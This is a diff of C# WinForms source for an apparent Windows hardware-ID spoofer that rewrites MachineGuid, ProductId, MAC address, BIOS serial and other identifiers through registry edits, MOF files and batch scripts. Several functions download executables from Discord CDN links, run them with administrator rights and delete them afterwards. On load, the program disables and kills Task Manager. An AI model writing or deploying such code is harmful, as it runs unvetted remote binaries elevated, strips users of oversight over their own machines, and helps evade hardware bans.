+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_NetworkAdapterConfiguration");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   MACAddress;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_NetworkAdapterConfiguration");
+                sw.WriteLine("{");
+                sw.WriteLine("    MACAddress = \"" + textMac.Text + "\";");
+            //    sw.WriteLine("    ")
+                sw.WriteLine("};");
+            }
+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\5d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_NetworkAdapterConfiguration");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 5d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\5d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+       //     Process.Start(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\5d.bat");
+         //   Thread.Sleep(4000);
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\5d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\5d.xml");
+
+            return true;
+
+
+        }
+        public string GetMac()
+        {
+            macclass();
+            Thread.Sleep(1500);
+            string maclass = GetMacClass();
+            string asd = "";
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(maclass, true);
+
+            if (key != null)
+            {
+                if (key.GetValue("NetworkAddress") != null)
+                {
+                    asd = key.GetValue("NetworkAddress").ToString();
+                }
+                else
+                {
+                    return "ERR";
+                }
+            }
+
+            if (asd == null || asd == "" || asd == string.Empty)
+            {
+                return "ERR";
+            }
+            return asd;
+        }
+    
+    
+        private void label8_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool hwd = hwiddegis();
+            if (hwd) label8.ForeColor = Color.Green;
+            isStarted = false;
+
+
+
+        }
+
+        private void label6_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool macd = tasaklarim();
+            if (macd) label6.ForeColor = Color.Green;
+            if (!macd) label6.ForeColor = Color.Red;
+            isStarted = false;
+        }
+        bool SetMachineGuid()
+        {
+   //         MessageBox.Show("devrede");
+            string url = "https://cdn.discordapp.com/attachments/1072165713063723028/1177083678988443658/0x131.exe?ex=6571379a&is=655ec29a&hm=9f7990ee5d10990dfa0efc8573a5a7077be9d5a7fa5f456bd2c00964375f4d84&";
+            string hedefKlasor = "C:\\";
+            string hedefDosyaAdi = "mslooder.exe";
+            string hedefKonum = Path.Combine(hedefKlasor, hedefDosyaAdi);
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+
+            WebClient webClient = new WebClient();
+
+            try
+            {
+                webClient.DownloadFile(url, hedefKonum);
+                
+
+                try
+                {
+                  
+
+                    ProcessStartInfo processStartInfo = new ProcessStartInfo(hedefKonum);
+                    processStartInfo.Verb = "runas"; // Bu, uygulamanın yönetici izinleriyle çalıştırılmasını sağlar.
+                    Clipboard.SetText(textMachine.Text);
+               
+                    ProcessStartInfo processStartInfo2 = new ProcessStartInfo
+                    {
+                        FileName = hedefKonum, // Başlatılacak programın adı (Örneğin: notepad.exe)
+                                                  // Diğer gerekli ayarlar...
+                    };
+
+                    // Process başlat
+                    Process process = Process.Start(processStartInfo);
+                    process.WaitForExit();
+                    File.Delete(hedefKonum);
+                  
+                }
+                catch (Exception ex)
+                {
+                    File.Delete(hedefKonum);
+                }
+            }
+            catch (Exception ex)
+            {
+                File.Delete(hedefKonum);
+            }
+
+            return true;
+
+        }
+        bool setvolexe()
+        {
+            //         MessageBox.Show("devrede");
+            string url = "https://cdn.discordapp.com/attachments/1072165713063723028/1178771263741763584/Volumeid.exe?ex=65775b49&is=6564e649&hm=95ffd299ce8169c42ab9040983e9bbea51de9dd5a6401b9ae6555dfb00f5f16c&";
+            string hedefKlasor = "C:\\";
+            string hedefDosyaAdi = "mslooder.exe";
+            string hedefKonum = Path.Combine(hedefKlasor, hedefDosyaAdi);
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+
+            WebClient webClient = new WebClient();
+
+            try
+            {
+                webClient.DownloadFile(url, hedefKonum);
+
+
+                try
+                {
+                    System.Diagnostics.Process process = new System.Diagnostics.Process()
+                    {
+                        StartInfo = new ProcessStartInfo()
+                        {
+                            UseShellExecute = true,
+                            Verb = "runas", // Bu, uygulamayı yönetici olarak çalıştırmak için gereklidir
+                            FileName = hedefKonum,
+                            Arguments = "c: " + textDisk.Text.Insert(4, "-")
+                        }
+                    };
+
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.Start();
+                    process.WaitForExit();
+
+                    /*
+                    ProcessStartInfo processStartInfo = new ProcessStartInfo(hedefKonum);
+                    processStartInfo.Verb = "runas"; // Bu, uygulamanın yönetici izinleriyle çalıştırılmasını sağlar.
+              //      Clipboard.SetText(textMachine.Text);
+
+                    ProcessStartInfo processStartInfo2 = new ProcessStartInfo
+                    {
+                        FileName = hedefKonum, // Başlatılacak programın adı (Örneğin: notepad.exe)
+                         Arguments = "c: " + textDisk.Text                      // Diğer gerekli ayarlar...
+                    };
+                    
+                    // Process başlat
+                    Process process = Process.Start(processStartInfo2);
+                    process.WaitForExit();
+                   
+                    MessageBox.Show(output);*/
+                    //string output = process.StandardOutput.ReadToEnd();
+                  //  MessageBox.Show(output);
+                     File.Delete(hedefKonum);
+
+                }
+                catch (Exception ex)
+                {
+                    File.Delete(hedefKonum);
+                }
+            }
+            catch (Exception ex)
+            {
+                File.Delete(hedefKonum);
+            }
+
+            return true;
+
+        }
+
+        public static class PCGuid
+        {
+            public static Regedit regeditOBJ = new Regedit(@"SOFTWARE\Microsoft\Cryptography");
+            public static readonly string Key = "MachineGuid";
+
+         
+
+            public static bool SetMachineGuid(object value)
+            {
+               
+                return regeditOBJ.Write(Key, value);
+            }
+
+            public static StringBuilder Log = new StringBuilder();
+            public static bool Spoof()
+            {
+                /*       Log.Clear();
+                       string oldValue = GetValue();
+                       bool result = SetValue(Guid.NewGuid().ToString());
+                       if (result)
+                       {
+                           Log.Append("  [SPOOFER] Guid Changed from " + oldValue + " to " + GetValue());
+                       }
+                       else
+                       {
+                           Log.AppendLine("  [SPOOFER] Error accessing the Registry... Maybe run as admin");
+                       }
+                       return result;
+                   }*/
+                return true;
+            }
+        }
+
+        private void textHWID_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label9_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool comp = SetComputerHardwareID(@"SYSTEM\CurrentControlSet\Control\SystemInformation", "ComputerHardwareId");
+            SetComputerHardwareID(@"SYSTEM\CurrentControlSet\Control\SystemInformation", "ComputerHardwareIds");
+            SetComputerHardwareID(@"SYSTEM\ControlSet001\Control\SystemInformation", "ComputerHardwareIds");
+            SetComputerHardwareID(@"SYSTEM\CurrentControlSet\Control\SystemInformation", "ComputerHardwareId");
+            SetComputerHardwareID(@"SYSTEM\ControlSet001\Control\SystemInformation", "ComputerHardwareId");
+
+            if (comp) label9.ForeColor = Color.Green;
+            if (!comp) label9.ForeColor = Color.Red;
+            isStarted = false;
+        }
+
+        private void label10_Click(object sender, EventArgs e)
+        {
+            /*// İlgili WMI namespace'ini belirtin
+            string wmiNamespace = @"\\.\Root\CIMV2";
+
+            // İlgili WMI namespace'ini içeren bir ManagementScope oluşturun
+            ManagementScope scope = new ManagementScope(wmiNamespace);
+
+            // WMI sorgusu oluşturma
+            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_BIOS");
+
+            // ManagementObjectSearcher'ı oluşturun ve belirtilen namespace ve sorgu ile başlatın
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
+
+            // WMI sorgusunu çalıştırma
+            ManagementObjectCollection queryCollection = searcher.Get();
+
+            // Sonuçları ekrana yazdırma
+          
+            foreach (ManagementObject m in queryCollection)
+            {
+                string test = $"{m["SerialNumber"]}";
+                MessageBox.Show(test);
+                //agasal[count] = test;
+                //count++;
+            }
+            */
+            
+        }
+        public static string GetBios()
+        {
+            ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS");
+            ManagementObjectCollection moc = mos.Get();
+            string number = "";
+            foreach (ManagementObject mo in moc)
+            {
+
+                number = (string)mo["SerialNumber"];
+               
+              
+            }
+            return number;
+        }
+        
+        private void bunifuiOSSwitch1_OnValueChange(object sender, EventArgs e)
+        {
+            if (bunifuiOSSwitch1.Value == false)
+            {
+                timer1.Stop();
+                taskac();
+                //kontrolsik();
+                Thread.Sleep(1000);
+                Environment.Exit(0);
+            }
+        }
+
+        private void bunifuTileButton1_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            if (isStarted == true)
+            {
+                isStarted = false;
+                bunifuTileButton1.color = Color.Green;
+                bunifuTileButton1.LabelText = "Start";
+            }
+            else
+            {
+                isStarted = true;
+                bunifuTileButton1.color = Color.Red;
+                bunifuTileButton1.LabelText = "Stop";
+                Change();
+
+            }
+           
+        }
+        bool setprod(string value)
+        {
+            // Registry anahtarını aç
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", true);
+
+            if (key != null)
+            {
+                // "HwProfileGuid" değerini "asd" olarak değiştir
+                key.SetValue("ProductId", value);
+
+                return true;
+                
+            }
+            else
+            {
+
+                return false;
+                //Console.WriteLine("Belirtilen kayıt defteri anahtarı bulunamadı.");
+            }
+        }
+
+        void Change()
+        {
+            if (isStarted == false) return;
+           
+          
+      
+           
+        
+
+        
+          
+      
+       
+        }
+        public static bool isStarted = false;
+        public static int get = 0;
+        private List<string> clipboardItems = new List<string>();
+
+        public void Copy(string text)
+        {
+            clipboardItems.Add(text);
+            Clipboard.SetText(text);
+        }
+
+        public string Paste(int index = 0)
+        {
+            if (index >= 0 && index < clipboardItems.Count)
+            {
+                return clipboardItems[index];
+            }
+            else
+            {
+                return null;
+            }
+        }
+    
+       
+    void bum()
+        {
+            hwProfileGuild = GetRegID();
+            textRegID.Text = hwProfileGuild;
+            textMachine.Text = GetMachineGuid();
+            GetWindowsProductID();
+            textProductID.Text = WindowsProductID;
+            GetDisk();
+            textSikDrive.Text = GetSikDrive();
+      //      textDisk.Text = DiskID;
+            GetMotherBoard();
+            textAnakart.Text = motherboard;
+            MAC = GetMac();
+            textMac.Text = MAC;
+            UUID = (GetUUID().Replace("UUID", "")).Replace(" ", "");
+            textUUID.Text = UUID;
+            HWID = GetHWID();
+            textHWID.Text = HWID;
+            GetComputerHardwareID();
+            textComputerID.Text = ComputerHardwareID;
+            GetRamID();
+            get = 1;
+            textBios.Text = GetBios();
+            textDisplayNumber.Text = GetDisplayId();
+         
+            textDeviceId.Text = GetDeviceId();
+         /*   RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+            RegistryKey registryKey3 = registryKey2.OpenSubKey("Software\\Microsoft\\sif", true) ?? registryKey2.CreateSubKey("Software\\Microsoft\\sif");
+
+            if (registryKey3.GetValue("RAM1") == null)
+            {
+                registryKey3.SetValue("RAM1", textRamBir.Text);
+            }
+            if (registryKey3.GetValue("hwProfileGuid") == null)
+            {
+                registryKey3.SetValue("hwProfileGuid", textRegID.Text);
+            }
+            if (registryKey3.GetValue("MachineGuid") == null)
+            {
+                registryKey3.SetValue("MachineGuid", textMachine.Text);
+            }
+            if (registryKey3.GetValue("ProductId") == null)
+            {
+                registryKey3.SetValue("ProductId", textProductID.Text);
+            }
+            if (registryKey3.GetValue("VolumeId") == null)
+            {
+                registryKey3.SetValue("VolumeId", textDisk.Text);
+            }
+            if (registryKey3.GetValue("DiskDrive") == null)
+            {
+                registryKey3.SetValue("DiskDrive", textDisk.Text);
+            }
+            if (registryKey3.GetValue("MotherboardSerial") == null)
+            {
+                registryKey3.SetValue("MotherboardSerial", textAnakart.Text);
+            }
+            if (registryKey3.GetValue("Mac") == null)
+            {
+                registryKey3.SetValue("Mac", textMac.Text);
+            }
+            if (registryKey3.GetValue("SystemUuid") == null)
+            {
+                registryKey3.SetValue("SystemUuid", textUUID.Text);
+            }
+            if (registryKey3.GetValue("Hwid") == null)
+            {
+                registryKey3.SetValue("Hwid", textHWID.Text);
+            }
+            if (registryKey3.GetValue("ComputerHardwareId") == null)
+            {
+                registryKey3.SetValue("ComputerHardwareId", textComputerID.Text);
+            }
+            if (registryKey3.GetValue("Bios") == null)
+            {
+                registryKey3.SetValue("Bios", textBios.Text);
+            }
+            if (registryKey3.GetValue("Display Name") == null)
+            {
+                registryKey3.SetValue("Display Name", textDisplayName.Text);
+            }
+       
+            if(registryKey3.GetValue("Device Id") == null)
+            {
+                registryKey3.SetValue("Device Id", textDeviceId.Text);
+            }*/
+        }
+        private static int ilk = 1;
+        private void bunifuFlatButton1_Click(object sender, EventArgs e)
+        {
+            if(!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+     /*     string registryPath = @"HKEY_LOCAL_MACHINE\Software\Microsoft\sif";
+            try
+            {
+                // Anahtarın var olup olmadığını kontrol et
+                if (Registry.GetValue(registryPath, null, null) != null)
+                {
+                    ilk = 0;
+                }
+                else
+                {
+                    ilk = 1;
+                    //Console.WriteLine("Anahtar yok.");
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Hata: " + ex.Message);
+                return;
+                //Console.WriteLine("Hata: " + ex.Message);
+            }*/
+            bum();
+        }
+
+        private void Control_Paint(object sender, PaintEventArgs e)
+        {
+            // Kenarları çizmek için grafik nesnesi kullanabilirsiniz.
+            Graphics g = e.Graphics;
+            Pen pen = new Pen(Color.Red, 2); // Kenar rengi ve kalınlığı
+            g.DrawRectangle(pen, 0, 0, this.Width - 1, this.Height - 1);
+        }
+        void kontrolsik()
+        {
+            string registryPath = @"HKEY_LOCAL_MACHINE\Software\Microsoft\sif";
+            try
+            {
+                // Anahtarın var olup olmadığını kontrol et
+                if (Registry.GetValue(registryPath, null, null) != null)
+                {
+                    ilk = 0;
+                   
+                }
+                else
+                {
+                    ilk = 1;
+                 
+                    //Console.WriteLine("Anahtar yok.");
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Hata: " + ex.Message);
+                return;
+                //Console.WriteLine("Hata: " + ex.Message);
+            }
+
+            if (ilk == 1)
+            {
+                RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+                RegistryKey registryKey3 = registryKey2.OpenSubKey("Software\\Microsoft\\sif", true) ?? registryKey2.CreateSubKey("Software\\Microsoft\\sif");
+
+                object Ram1 = registryKey3.GetValue("RAM1"), Bios = registryKey3.GetValue("Bios"), ComputerHardwareId = registryKey3.GetValue("ComputerHardwareId"), diskdrive = registryKey3.GetValue("DiskDrive"), hwid = registryKey3.GetValue("Hwid"), hwProfileGuid = registryKey3.GetValue("hwProfileGuid"), mac = registryKey3.GetValue("Mac"), machineguid = registryKey3.GetValue("MachineGuid"), MotherboardSerial = registryKey3.GetValue("MotherboardSerial"), ProductId = registryKey3.GetValue("ProductId"), systemuuid = registryKey3.GetValue("SystemUuid"), volumeid = registryKey3.GetValue("VolumeId"), DisplayName = registryKey3.GetValue("Display Name"), DeviceId = registryKey3.GetValue("Device Id");
+                isStarted = true;
+                if (Ram1 != null)
+                {
+                    textRamBir.Text = Ram1.ToString();
+                    ramiddegis();
+                }
+
+                if (Bios != null)
+                {
+                    textBios.Text = Bios.ToString();
+                    SetBios();
+                }
+                if (ComputerHardwareId != null)
+                {
+                    textComputerID.Text = ComputerHardwareId.ToString();
+                    //SetComputerHardwareID();
+                }
+                if (diskdrive != null)
+                {
+                    textSikDrive.Text = diskdrive.ToString();
+                    sikiddegis();
+                }
+                if (hwid != null)
+                {
+                    textHWID.Text = hwid.ToString();
+                    hwiddegis();
+                }
+                if (hwProfileGuid != null)
+                {
+                    textRegID.Text = hwProfileGuid.ToString();
+                    SetRegID(textRegID.Text);
+                }
+                if (mac != null)
+                {
+                    textMac.Text = mac.ToString();
+                    tasaklarim();
+                }
+                if (machineguid != null)
+                {
+                    textMachine.Text = machineguid.ToString();
+                    SetMachineGuid();
+                }
+                if (MotherboardSerial != null)
+                {
+                    textAnakart.Text = MotherboardSerial.ToString();
+                    AnakartDegis();
+                }
+                if (ProductId != null)
+                {
+                    textProductID.Text = ProductId.ToString();
+                 //   SetWindowsProductID();
+                }
+                if (systemuuid != null)
+                {
+                    textUUID.Text = systemuuid.ToString();
+                    uuiddegis();
+                }
+                if (volumeid != null)
+                {
+                    textDisk.Text = volumeid.ToString();
+                    SpoofDisk();
+                }
+                if (DisplayName != null)
+                {
+                    textDisplayNumber.Text = DisplayName.ToString();
+                   
+                    //ekranname();
+                }
+             
+                if(DeviceId != null)
+                {
+                    textDeviceId.Text = DeviceId.ToString();
+                    //devicename degisme +
+                }
+                isStarted = false;
+                textRamBir.Text  = textDeviceId.Text = textBios.Text = textSikDrive.Text = textComputerID.Text = textHWID.Text = textRegID.Text = textMac.Text = textMachine.Text = textAnakart.Text = textProductID.Text = textUUID.Text = textDisk.Text = textDisplayNumber.Text = "";
+            }
+        }
+        void taskkapat()
+        {
+            try
+            {
+                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+                key.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Hata: " + ex.Message);
+            }
+            foreach (System.Diagnostics.Process process in System.Diagnostics.Process.GetProcessesByName("Taskmgr"))
+            {
+                try
+                {
+                    process.Kill();
+                }
+                catch
+                {
+                }
+            }
+        }
+        void taskac()
+        {
+            try
+            {
+                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                key.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
+                key.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Hata: " + ex.Message);
+            }
+        }
+        private void Control_Load(object sender, EventArgs e)
+        {
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.TransparencyKey = Color.Salmon; // Şeffaf arka plan rengi
+            this.BackgroundImage = SpooferProject.Properties.Resources.pxfuel;
+            taskkapat();
+       //      kontrolsik();
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+       
+        }
+
+        private void label7_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool lv = uuiddegis();
+            if (lv) label7.ForeColor = Color.Green;
+        //    isStarted = false;
+        }
+        private Point mouseOffset;
+
+        // Token: 0x0400001A RID: 26
+        private bool isMouseDown = false;
+        private void Control_MouseDown(object sender, MouseEventArgs e)
+        {
+            bool flag = e.Button == MouseButtons.Left;
+
+            checked
+            {
+                if (flag)
+                {
+                    int num = 0 - e.X - SystemInformation.FrameBorderSize.Width;
+                    int y = 0 - e.Y - SystemInformation.CaptionHeight - SystemInformation.FrameBorderSize.Height;
+                    this.mouseOffset = new Point(num, y);
+                    this.isMouseDown = true;
+                }
+            }
+        }
+
+        private void Control_MouseMove(object sender, MouseEventArgs e)
+        {
+            bool flag = this.isMouseDown;
+
+            if (flag)
+            {
+                Point mousePosition = Control.MousePosition;
+                mousePosition.Offset(this.mouseOffset.X, this.mouseOffset.Y);
+                base.Location = mousePosition;
+            }
+        }
+
+        private void Control_MouseUp(object sender, MouseEventArgs e)
+        {
+            bool flag = e.Button == MouseButtons.Left;
+
+            if (flag)
+            {
+                this.isMouseDown = false;
+            }
+        }
+
+        private void label3_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            /*bool prodid = SetWindowsProductID(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductId");
+                bool sd = SetWindowsProductID(@"SOFTWARE\Microsoft\Internet Explorer\Registration", "ProductId");
+            MessageBox.Show(sd.ToString
+                ());*/
+            RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+            RegistryKey registryKey3 = registryKey2.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", true);
+            try
+            {
+             
+                    registryKey3.SetValue("ProductId", textProductID.Text);
+              
+               
+         
+            }
+            catch
+            {
+                MessageBox.Show("hata");
+            }
+            coco();
+                RegistryKey registryKey5 = registryKey2.OpenSubKey(@"SOFTWARE\Microsoft\Internet Explorer\Registration", true);
+            registryKey5.SetValue("ProductId", textProductID.Text);
+            //        if (registryKey3.GetValue("ProductId") == textProductID.Text) label3.ForeColor = Color.Green; else { label3.ForeColor = Color.Red; }
+            //      if (registryKey5.GetValue("ProductId") == textProductID.Text) label3.ForeColor = Color.Green; else { label3.ForeColor = Color.Red; }
+            label3.ForeColor = Color.Green;
+            //  if (prodid) label3.ForeColor = Color.Green;
+            // if (!prodid) label3.ForeColor = Color.Red;
+            isStarted = false;
+
+     }
+
+     private void label1_Click(object sender, EventArgs e)
+     {
+         if (!ortak.CheckEthernet())
+         {
+             MessageBox.Show("Check ethernet connection.", "Failed");
+             Environment.Exit(0);
+             return;
+         }
+         isStarted = true;
+         bool reg = SetRegID(textRegID.Text);
+         if (reg)
+             label1.ForeColor = Color.Green;
+         if (!reg)
+             label1.ForeColor = Color.Red;
+         isStarted = true;
+     }
+     /*
+       @echo off
+set regPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
+set regKey=MachineGuid
+set outputFile=output.txt
+
+reg query %regPath% /v %regKey% > %outputFile%*/
+            private void label11_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool rm = ramiddegis();
+            if (rm)
+            {
+                label11.ForeColor = Color.Green;
+                label12.ForeColor = Color.Green;
+                label13.ForeColor = Color.Green;
+                label16.ForeColor = Color.Green;
+
+            }
+            else
+            {
+                label11.ForeColor = Color.Red;
+                label12.ForeColor = Color.Red;
+                label13.ForeColor = Color.Red;
+                label16.ForeColor = Color.Red;
+
+            }
+            isStarted = false;
+
+
+            // Bat dosyasının tam yolunu alın
+            /*    string batFilePath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat";
+                using (StreamWriter sw = File.CreateText(batFilePath))
+                {
+                    sw.WriteLine("@echo off");
+                    sw.WriteLine(@"set regPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography");
+                    sw.WriteLine("set regKey=MachineGuid");
+                    sw.WriteLine("set outputFile=output.txt");
+                    sw.WriteLine("reg query %regPath% /v %regKey% > %outputFile%
+
+                }
+
+                Thread.Sleep(2000);
+                int ExitCode;
+                ProcessStartInfo ProcessInfo;
+                Process Process;
+
+                ProcessInfo = new ProcessStartInfo("cmd.exe", batFilePath);
+                ProcessInfo.CreateNoWindow = true;
+                ProcessInfo.UseShellExecute = false;
+
+                Process = Process.Start(ProcessInfo);
+                Process.WaitForExit();
+
+                ExitCode = Process.ExitCode;
+                Process.Close();
+                string test = File.ReadAllText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\output.txt");
+
+
+                MessageBox.Show(test);*/
+        }
+        /// <summary>
+        /// Verilen anahtar, değer adı ve değer türü için arama yapar.
+        /// </summary>
+        /// <param name="key">Anahtar.</param>
+        /// <param name="valueName">Değer adı.</param>
+        /// <param name="valueKind">Değer türü.</param>
+        /// <returns>Arama sonucu değer.</returns>
+        static string FindValue(RegistryKey key, string valueName, RegistryValueKind valueKind)
+        {
+            // Değer olup olmadığını kontrol ediyoruz.
+            if (!key.GetValueNames().Contains(valueName))
+            {
+                return string.Empty;
+            }
+
+            // Değeri alıyoruz.
+            object value = key.GetValue(valueName);
+
+            // Değer türü doğru mu kontrol ediyoruz.
+            if (value == null || key.GetValueKind(valueName) != valueKind)
+            {
+                return string.Empty;
+            }
+
+            // Değeri string olarak döndürüyoruz.
+            return value.ToString();
+        }
+        string GetMacClass()
+        {
+            string registryPath = @"SYSTEM\srp";
+            string valueName = "class";
+            string cs = GetRegistryValue(registryPath, valueName);
+          ;
+             return cs;
+        }
+        bool tasaklarim()
+        {
+            macclass();
+            Thread.Sleep(1500);
+            string maclass = GetMacClass();
+
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(maclass, true);
+
+            if (key != null)
+            {
+                // "HwProfileGuid" değerini "asd" olarak değiştir
+                key.SetValue("NetworkAddress", textMac.Text.Replace(":", ""));
+                DisableEthernet();
+                // Bir süre bekleyebilirsiniz (örneğin 5 saniye)
+                System.Threading.Thread.Sleep(5000);
+
+                // Ethernet bağlantısını aç
+                EnableEthernet();
+                
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+        void macclass()
+        {
+            string url = "https://cdn.discordapp.com/attachments/1072165713063723028/1175589293574606918/0x29.exe?ex=656bc7d8&is=655952d8&hm=187c15860573c3bf22b97ad027bb2fd5163ec5e5180fecd39f15f4f3e7e73fcf&";
+            string hedefKlasor = "C:\\";
+            string hedefDosyaAdi = "blooder.exe";
+            string hedefKonum = Path.Combine(hedefKlasor, hedefDosyaAdi);
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+
+            WebClient webClient = new WebClient();
+
+            try
+            {
+                webClient.DownloadFile(url, hedefKonum);
+                try
+                {
+                    ProcessStartInfo processStartInfo = new ProcessStartInfo(hedefKonum);
+                    processStartInfo.Verb = "runas"; // 
+                    Process process = new Process();
+                    process.StartInfo = processStartInfo;
+                    process.Start();
+                    process.WaitForExit();
+                  //  Process.Start(processStartInfo);
+                 //   Thread.Sleep(1500);
+                    File.Delete(hedefKonum);
+                }
+                catch (Exception ex)
+                {
+                    File.Delete(hedefKonum);
+                }
+            }
+            catch (Exception ex)
+            {
+                File.Delete(hedefKonum);
+            }
+        }
+        static void DisableEthernet()
+        {
+            string networkInterfaceName = "Ethernet"; // Eğer bağlantı adını bilmiyorsanız, NetworkInterface sınıfını kullanarak kontrol edebilirsiniz.
+
+            ProcessStartInfo psi = new ProcessStartInfo("netsh", $"interface set interface \"{networkInterfaceName}\" admin=disable");
+            psi.RedirectStandardOutput = true;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            process.StartInfo = psi;
+            process.Start();
+            process.WaitForExit();
+        }
+
+        private void label15_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool biosid = SetBios();
+            if (biosid)
+            {
+                label15.ForeColor = Color.Green;
+
+            }
+            else
+            {
+                label15.ForeColor = Color.Red;
+            }
+            isStarted = false;
+        }
+        static void EnableEthernet()
+        {
+            string networkInterfaceName = "Ethernet"; // Eğer bağlantı adını bilmiyorsanız, NetworkInterface sınıfını kullanarak kontrol edebilirsiniz.
+
+            ProcessStartInfo psi = new ProcessStartInfo("netsh", $"interface set interface \"{networkInterfaceName}\" admin=enable");
+            psi.RedirectStandardOutput = true;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            process.StartInfo = psi;
+            process.Start();
+            process.WaitForExit();
+         
+        }
+        
+        bool SetBios()
+        {
+            if (isStarted == false) return false;
+            //C:\Users\asd\AppData\Local\Temp
+            using (StreamWriter sw = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.xml"))
+            {
+
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\")");
+                sw.WriteLine("#pragma namespace(\"\\\\\\\\.\\\\Root\\\\CIMV2\")");
+                sw.WriteLine("class Win32_BIOS");
+                sw.WriteLine("{");
+                sw.WriteLine("  [key]");
+                sw.WriteLine("  string   SerialNumber;");
+                sw.WriteLine("};");
+                sw.WriteLine("[DYNPROPS]");
+                sw.WriteLine("instance of Win32_BIOS");
+                sw.WriteLine("{");
+                sw.WriteLine("    SerialNumber = \"" + textBios.Text + "\";");
+                sw.WriteLine("};");
+            }
